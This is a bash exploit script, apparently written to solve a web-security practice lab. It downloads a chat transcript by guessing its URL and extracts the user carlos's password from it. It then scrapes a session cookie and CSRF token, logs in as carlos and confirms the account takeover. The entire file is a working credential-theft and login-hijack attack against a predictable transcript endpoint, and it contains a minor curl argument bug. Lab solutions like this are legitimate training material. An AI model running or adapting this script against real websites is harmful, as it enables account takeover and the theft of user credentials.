#! /bin/bash

get_password() {

    echo "(+) Getting Carlos's password..."
    chat_url="${url}/download-transcript/1.txt"
    export password=$(curl -s ${chat_url} | grep "my password is" | cut -d " " -f 7 | sed s/\.$// )
    echo "(+) The password is : ${password}"
    
}

get_csrf() {

    export cookie=$(curl -s -c - ${login_page} | awk '/session/ {print $NF}')
    export token=$(curl -s ${login_page} -b "session=${cookie}" | grep csrf | cut -d '"' -f 6)
    
}

login() {

    echo "(+) Logging is as user carlos..."
    login_page="${url}/login"
    get_csrf "$login_page"
    credentials="csrf=${token}&username=carlos&password=${password}"
    newcookie=$(curl -s -c - "%{http_code}" "$login_page" -d "$credentials" -b "session=${cookie}" | awk '/session/ {print $NF}')
    account_page="${url}/my-account?id=carlos"
    response=$(curl -s ${account_page} -b "session=${newcookie}")
    if echo "$response" | grep -q "Log out"; then
        echo "(+) Logged in successfully!"
    else
        echo "(-) Failed to log in"
        echo "(-) Exiting..."
        exit 1
    fi
}

main() {

    if [ $# -ne 1 ];then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1

    fi

    echo "(+) Starting the script..."
    url=$1
    get_password "$url"
    login "$url"



}

main "$@"